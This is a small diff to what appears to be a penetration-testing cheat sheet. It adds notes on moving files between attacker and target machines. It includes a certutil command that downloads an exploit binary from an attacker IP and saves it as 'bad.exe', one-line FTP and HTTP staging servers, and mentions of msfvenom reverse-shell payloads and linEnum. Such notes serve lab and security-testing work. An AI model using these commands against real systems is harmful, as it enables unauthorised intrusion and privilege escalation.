@@ -92,8 +92,10 @@ Payloads other than msf:
 * `msfvenom`
   * for example, can create a reverse shell tomcat war file
 
-Download file to windows:
-`certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`
+Download file to windows or linux:
+* `certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`
+* `python -m pyftpdlib 21` on host to start ftp server
+* `python -m SimpleHTTPServer 80` from lhost and get from rhost
 
 Escalate user:
 * `linEnum`
